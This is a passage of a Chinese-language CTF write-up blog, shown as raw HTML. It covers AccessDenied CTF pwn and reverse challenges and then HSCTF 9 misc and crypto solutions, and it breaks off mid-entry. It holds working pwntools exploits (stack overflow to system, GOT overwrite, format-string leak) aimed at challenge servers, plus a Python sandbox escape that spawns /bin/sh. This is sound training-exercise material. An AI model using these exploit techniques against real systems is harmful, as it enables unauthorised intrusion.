class="hljs-built_in">printf</span>(&quot;Enter the buffer now\n&quot;);<br><span class="hljs-built_in">fgets</span>(buf, <span class="hljs-number">64</span>, stdin);<br>&#125;<br><br>void <span class="hljs-selector-tag">main</span>()&#123;<br>    <span class="hljs-built_in">setbuf</span>(stdin, NULL);<br>    <span class="hljs-built_in">setbuf</span>(stdout, NULL);<br>    <span class="hljs-built_in">alarm</span>(<span class="hljs-number">0</span>x20);<br>    <span class="hljs-built_in">vuln</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>vuln存在一个缓冲区溢出，看了一下开了栈不可执行。所以没法传shellcode。这里给了一个store是在堆里面的。这个变量的地址是固定的。我们可以得到。所以利用这个变量来传参数&quot;/bin/sh&quot;然后溢出劫持到system。执行system(&quot;/bin/sh&quot;)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;34.134.85.196&quot;</span>, <span class="hljs-number">9337</span>)<br><br><span class="hljs-comment"># 堆中写入字符串</span><br>r.sendline(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br><br>straddress = p32(<span class="hljs-number">0x0804C060</span>)<br>system = p32(<span class="hljs-number">0x08049236</span>)<br><br>r.sendline(system*<span class="hljs-number">12</span> + straddress)<br>r.sendline(<span class="hljs-string">b&quot;ls&quot;</span>)<br>r.interactive()<br>r.closed()<br><br><span class="hljs-comment"># accessdenied&#123;n3xt_1_w1ll_n0t_1nclud3_system_func710n_1t53lf_e8dd6fc7&#125;</span><br></code></pre></td></tr></table></figure><h2 id="oob"><a class="markdownIt-Anchor" href="#oob"></a> OOB</h2><p>Description：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">I only have an<span class="hljs-built_in"> array </span>here<br>server: nc 34.71.207.70 1337<br></code></pre></td></tr></table></figure><p>给了代码和文件。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> arr[<span class="hljs-number">16</span>];<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> index, value;<br>    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">alarm</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the index: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;index);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the value: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;value);<br>    arr[index] = value;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good bye&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到一个arr在堆里面。我们可以通过arr这个地址来操控向任意地址写入。所以覆写puts的got表到win函数即可。这里puts的地址在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>elf = ELF(<span class="hljs-string">r&quot;oob&quot;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>win = elf.symbols[<span class="hljs-string">&quot;win&quot;</span>]<br>arr = elf.symbols[<span class="hljs-string">&quot;arr&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;win:&quot;</span>,<span class="hljs-built_in">hex</span>(win))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;arr:&quot;</span>,<span class="hljs-built_in">hex</span>(arr))<br><br>distance = (puts_got - arr) // <span class="hljs-number">4</span><br><span class="hljs-built_in">print</span>(distance)<br><br>r = remote(<span class="hljs-string">&quot;34.71.207.70&quot;</span>, <span class="hljs-number">1337</span>)<br><br>r.sendline(<span class="hljs-built_in">str</span>(distance).encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>r.sendline(<span class="hljs-built_in">str</span>(win).encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><span class="hljs-built_in">print</span>(r.recvline())<br><br><span class="hljs-comment"># accessdenied&#123;00b_4r3_v3ry_us3ful_r1ght_54a4ce45&#125;</span><br></code></pre></td></tr></table></figure><h2 id="read"><a class="markdownIt-Anchor" href="#read"></a> <strong>Read</strong></h2><p>Description：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Read</span>, <span class="hljs-keyword">Read</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">Read</span>.<br><span class="hljs-keyword">server</span>: nc <span class="hljs-number">34.71</span><span class="hljs-number">.207</span><span class="hljs-number">.70</span> <span class="hljs-number">5337</span><br></code></pre></td></tr></table></figure><p>代码和文件都给了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">char</span> flag[<span class="hljs-number">64</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">char</span> name[<span class="hljs-number">32</span>];<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    alarm(<span class="hljs-number">0x20</span>);<br>FILE *f = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">if</span> (f == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Flag File is Missing. \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>fgets(flag, <span class="hljs-number">64</span>,f);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enter your name&quot;</span>);<br>read(<span class="hljs-number">0</span>, name, <span class="hljs-number">32</span>);<br><span class="hljs-built_in">printf</span>(name);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有个格式化字符串漏洞。这里我们要来利用这个漏洞来泄露flag的值。由于flag的地址高位是0，所以我们选择放在后面输入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">r&quot;format_string_read&quot;</span>)<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>flag_add = elf.symbols[<span class="hljs-string">&quot;flag&quot;</span>]<br><br>r = remote(<span class="hljs-string">&quot;34.71.207.70&quot;</span>, <span class="hljs-number">5337</span>)<br><br><span class="hljs-comment"># 由于是64位系统，地址8字节对齐所以前面我们需要填充至8字节。</span><br><span class="hljs-comment"># 字符串起始实际上是第八个参数。但这里我们讲flag放在字符串的第二个位置，所以读取位置+1</span><br>r.sendline(<span class="hljs-string">b&quot;%9$spppp&quot;</span> + p64(flag_add))<br><br><span class="hljs-built_in">print</span>(r.recvline())<br><span class="hljs-built_in">print</span>(r.recvline())<br><br><span class="hljs-comment"># accessdenied&#123;f0rm4t_5tr1ng_r34d_0fa330d1&#125;</span><br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><p>这一类我只写了一部分，还有一些是我朋友写的。</p><h2 id="babyc"><a class="markdownIt-Anchor" href="#babyc"></a> <strong>babyc</strong></h2><p>Description：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">C <span class="hljs-keyword">the</span> world <span class="hljs-keyword">with</span> see.<br></code></pre></td></tr></table></figure><p>文件是源代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100</span><br><span class="hljs-type">char</span> flag[] = &#123;<span class="hljs-number">-111</span>, <span class="hljs-number">-47</span>, <span class="hljs-number">-47</span>, <span class="hljs-number">-79</span>, <span class="hljs-number">-39</span>, <span class="hljs-number">-39</span>, <span class="hljs-number">49</span>, <span class="hljs-number">-79</span>, <span class="hljs-number">97</span>, <span class="hljs-number">-127</span>, <span class="hljs-number">-79</span>, <span class="hljs-number">49</span>, <span class="hljs-number">-55</span>, <span class="hljs-number">9</span>, <span class="hljs-number">27</span>, <span class="hljs-number">89</span>, <span class="hljs-number">-19</span>, <span class="hljs-number">59</span>, <span class="hljs-number">97</span>, <span class="hljs-number">49</span>, <span class="hljs-number">-19</span>, <span class="hljs-number">89</span>, <span class="hljs-number">-37</span>, <span class="hljs-number">121</span>, <span class="hljs-number">-37</span>, <span class="hljs-number">89</span>, <span class="hljs-number">-69</span>, <span class="hljs-number">-37</span>, <span class="hljs-number">-19</span>, <span class="hljs-number">-111</span>, <span class="hljs-number">89</span>, <span class="hljs-number">-37</span>, <span class="hljs-number">-19</span>, <span class="hljs-number">113</span>, <span class="hljs-number">-71</span>, <span class="hljs-number">97</span>, <span class="hljs-number">-19</span>, <span class="hljs-number">-101</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">11</span>, <span class="hljs-number">91</span>, <span class="hljs-number">-69</span>, <span class="hljs-number">11</span>, <span class="hljs-number">-79</span>, <span class="hljs-number">-87</span>&#125;;<br><br><span class="hljs-type">char</span> <span class="hljs-title function_">reverse</span><span class="hljs-params">(<span class="hljs-type">char</span> ch)</span> &#123;<br>    <span class="hljs-type">int</span> x = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        x *= <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span>((ch &amp; (<span class="hljs-number">1</span> &lt;&lt; i))) &#123;<br>            x++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">char</span>)x;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">encode</span><span class="hljs-params">(<span class="hljs-type">char</span> str[])</span> &#123;<br>    <span class="hljs-type">int</span> xor = <span class="hljs-number">23</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; str[i] != <span class="hljs-string">&#x27;\0&#x27;</span>; i++) &#123;<br>        str[i] = reverse(str[i]);<br>        str[i] = (<span class="hljs-type">char</span>)(xor ^ str[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <br>    <span class="hljs-type">char</span> str[MAXSIZE];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%100s&quot;</span>, str);<br><br>    getchar();<br>    encode(str);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(flag, str) == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access Granted :(&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access Denied :)&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接爆破。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> char_set[] = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&quot;</span>;<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">46</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">94</span>; j++) &#123;<br>            <span class="hljs-keyword">if</span> (flag[i] == (<span class="hljs-type">char</span>)(<span class="hljs-number">23</span> ^ reverse(char_set[j])))&#123; <br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, char_set[j]);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// accessdenied&#123;x0r_4nd_r3v3r53_ar3_fun_1dd8258e&#125;</span><br></code></pre></td></tr></table></figure><p>最后还是只拿到了33名，也还算不错了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>PWN</tag>
      
      <tag>MISC</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HSCTF 9</title>
    <link href="/2022/06/12/HSCTF-9/"/>
    <url>/2022/06/12/HSCTF-9/</url>
    
    <content type="html"><![CDATA[<p>HSCTF 9</p><span id="more"></span><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="the-great-directory-egg-hunt"><a class="markdownIt-Anchor" href="#the-great-directory-egg-hunt"></a> the-great-directory-egg-hunt</h2><p>Description：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs livecodeserver">Lots <span class="hljs-keyword">of</span> branching paths, but how <span class="hljs-built_in">do</span> we <span class="hljs-built_in">get</span> <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> correct <span class="hljs-built_in">file</span>?<br></code></pre></td></tr></table></figure><p>附件是一个压缩包。<br />解压后里面目录很多。每个叶子都是一个file.txt文件。看来我们需要在这里面找到我们的flag。<br />这个直接用windows自带的搜索就行了。不过要打开搜索文件内容的选项。</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">.\Tw\<span class="hljs-number">3</span>l\v3\_D\<span class="hljs-number">1</span>r\s_\D3\<span class="hljs-number">3</span>p\_6\Gi\TQ\Ez<br></code></pre></td></tr></table></figure><p>这个目录下找到了相关文件。内容为：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">If you followed <span class="hljs-keyword">the</span> <span class="hljs-built_in">directories</span> <span class="hljs-built_in">to</span> here, you have found <span class="hljs-keyword">the</span> flag!<br>Use <span class="hljs-keyword">the</span> <span class="hljs-built_in">directory</span> names (<span class="hljs-keyword">without</span> slashes) <span class="hljs-keyword">as</span> part <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> flag, <span class="hljs-keyword">then</span> <span class="hljs-keyword">wrap</span> <span class="hljs-keyword">it</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> flag <span class="hljs-built_in">format</span> <span class="hljs-string">&quot;flag&#123;&#125;&quot;</span>.<br></code></pre></td></tr></table></figure><p>那么flag为：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Tw3lv3_D1rs_D33p_6GiTQEz&#125;</span><br></code></pre></td></tr></table></figure><h2 id="onchain-baller"><a class="markdownIt-Anchor" href="#onchain-baller"></a> onchain-baller</h2><p>Description：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">Have <span class="hljs-keyword">this</span> Ropsten testnet address: <span class="hljs-number">0x339d58bff8b8C5dAAfaF08fA77ad39C7909B194E</span><br></code></pre></td></tr></table></figure><p>这个是以太坊的题。给了一个账户地址。找找看。<br /><a href="https://ropsten.etherscan.io/blocks">https://ropsten.etherscan.io/blocks</a><br />搜索这个地址。可以找到这个账户，这里有部分交易记录。<br />在Txn Hash为0xce01ddd8ad56b6b9b11796f9ebf1cd29e7034d82ff98978f2c4178a91a34cf46的交易中，其input data为：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">0</span>x68736374667b315f623431315f306e5f346e645f3066665f7468335f636834316e7d<br><br><span class="hljs-meta"># hsctf&#123;1_b411_0n_4nd_0ff_th3_ch41n&#125;</span><br></code></pre></td></tr></table></figure><h2 id="paas"><a class="markdownIt-Anchor" href="#paas"></a> paas</h2><p>Description：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">Run</span> Python code <span class="hljs-keyword">from</span> anywhere! nc paas.hsctf.com 1337<br></code></pre></td></tr></table></figure><p>nc连上后发现输入的代码都会被执行。但是他过滤了很多字符。比如 &quot;./_’&quot;这些。但是没有过滤括号。所以我们可以使用函数的。那么直接使用eval和input的组合就可以执行指令了。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">== proof-of-work: disabled ==</span><br>Python as a Service:<br>Execute arbitrary Python code (with certain restrictions)<br>&gt; eval(input())<br><span class="hljs-emphasis">__import__</span>(<span class="hljs-emphasis">&#x27;os&#x27;</span>).system(<span class="hljs-emphasis">&#x27;/bin/sh&#x27;</span>)<br>ls<br>flag<br>paas.py<br>cat flag<br>flag&#123;vuln3r4b1l17y_45_4_53rv1c3&#125;<br><br># flag&#123;vuln3r4b1l17y_45_4_53rv1c3&#125;<br></code></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="lcvc"><a class="markdownIt-Anchor" href="#lcvc"></a> lcvc</h2><p>Description：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">Ciphertext: mawhxyovhiiupukqnzdekudetmjmefkqjgmqndgtnrxqxludegwovdcdmjjhw Please wrap <span class="hljs-built_in">in</span> the <span class="hljs-built_in">flag</span> <span class="hljs-built_in">format</span>: <span class="hljs-built_in">flag</span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>一个附件，是加密算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">state = <span class="hljs-number">1</span><br>flag = <span class="hljs-string">&quot;[REDACTED]&quot;</span><br>alphabet = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="hljs-keyword">assert</span>(flag[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]+flag[-<span class="hljs-number">1</span>]==<span class="hljs-string">&quot;flag&#123;&#125;&quot;</span>)<br>ciphertext = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> character <span class="hljs-keyword">in</span> flag[<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>]:<br>    state = (<span class="hljs-number">15</span>*state+<span class="hljs-number">18</span>)%<span class="hljs-number">29</span><br>    ciphertext+=alphabet[(alphabet.index(character)+state)%<span class="hljs-number">26</span>]<br><span class="hljs-built_in">print</span>(ciphertext)<br></code></pre></td></tr></table></figure><p>这里直接爆破就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"> state = <span class="hljs-number">1</span><br>alphabet = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br>c = <span class="hljs-string">&quot;mawhxyovhiiupukqnzdekudetmjmefkqjgmqndgtnrxqxludegwovdcdmjjhw&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c :<br>    state = (<span class="hljs-number">15</span> * state + <span class="hljs-number">18</span>) % <span class="hljs-number">29</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> alphabet:<br>        <span class="hljs-keyword">if</span> alphabet[(alphabet.index(j)+state)%<span class="hljs-number">26</span>] == i:<br>            <span class="hljs-built_in">print</span>(j, end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># iguessthisiswhatyouwouldcallalinearcongruentialvigenerecipher</span><br><span class="hljs-comment"># flag&#123;iguessthisiswhatyouwouldcallalinearcongruentialvigenerecipher&#125;</span><br></code></pre></td></tr></table></figure><h2 id="quagmire-i"><a class="markdownIt-Anchor" href="#quagmire-i"></a> quagmire-i</h2><p>Description：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Bob was <span class="hljs-keyword">on</span> his way <span class="hljs-keyword">to</span> school <span class="hljs-keyword">and</span> go <span class="hljs-keyword">to</span> Mr. Connolly’s <span class="hljs-keyword">first</span> period AP CSA <span class="hljs-built_in">class</span>, <span class="hljs-keyword">but</span> <span class="hljs-keyword">it</span> was a rainy <span class="hljs-built_in">day</span> <span class="hljs-keyword">and</span> he got stuck <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> quagmire <span class="hljs-keyword">in</span> his town, making him late <span class="hljs-keyword">to</span> school (specifically <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> closest <span class="hljs-keyword">to</span> his home, there are apparently four quagmires <span class="hljs-keyword">in</span> his town)! Could you figure out what Mr. Connolly told Bob’s <span class="hljs-built_in">class</span>? His classmate Alice sent this <span class="hljs-built_in">text</span> message <span class="hljs-keyword">after</span> <span class="hljs-built_in">class</span> (written <span class="hljs-keyword">in</span> Quagmire I):<br>```<br>Plaintext keyword: CONNOLLYROCKS<br>Indicator keyword: HSCTF<br>Indicator position: A<br>Ciphertext: LZXORNZBUYWNRARNOVGCLSQWJEFJFE<br>```<br>(Please wrap <span class="hljs-keyword">the</span> flag <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> flag format “flag&#123;&#125;”, <span class="hljs-keyword">and</span> use only uppercase letters within <span class="hljs-keyword">the</span> braces.)<br></code></pre></td></tr></table></figure><p>不认识的加密，问问谷歌好了。找到一个解密的。</p><p><a href="https://mysterytoolbox.organisingchaos.com/Ciphers/cipher/QuagmireI">https://mysterytoolbox.organisingchaos.com/Ciphers/cipher/QuagmireI</a></p><p>Keyed Alphabet key和Vigenere Key分别是CONNOLLYROCKS和HSCTF。解密即可。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">FILLTHISBOWLWITHYOURFAVEFRUITS</span><br><br><span class="hljs-comment"># flag&#123;FILLTHISBOWLWITHYOURFAVEFRUITS&#125;</span><br></code></pre></td></tr></table></figure><h2 id="baby-baby-rsa"><a class="markdownIt-Anchor" href="#baby-baby-rsa"></a> baby-baby-rsa</h2><p>Description：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">You should 